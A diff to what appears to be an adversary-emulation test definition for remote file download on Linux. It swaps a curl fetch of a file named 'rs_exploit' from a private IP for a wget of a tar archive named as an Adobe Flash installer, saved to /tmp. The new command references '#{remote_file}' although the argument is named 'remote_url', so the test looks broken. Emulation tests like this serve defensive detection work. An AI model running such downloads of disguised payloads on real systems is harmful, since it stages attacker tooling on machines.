@@ -721,20 +721,16 @@ atomic_tests:
     - linux
   input_arguments:
     remote_url:
-      description: url of remote host
+      description: url of remote file
       type: string
-      default: 192.168.57.101 
-    file_name:
-      description: name of the file to download
-      type: string
-      default:  rs_exploit
+      default: https://github.com/hkwany/VIndex/raw/master/VIndex/TTP/T1105/binary/Adobe_Flash_install.tar
     dest_path:
       description: destination to store the downloaded file
       type: string
-      default:  /tmp/rs_exploit
+      default: /tmp/Adobe_Flash_install.tar
   executor:
     command: |
-      curl http://#{remote_url}/#{file_name} --output ${dest_path}
+      wget #{remote_file} -O #{dest_path}
     cleanup_command: |
       rm ${dest_path}
     name: sh
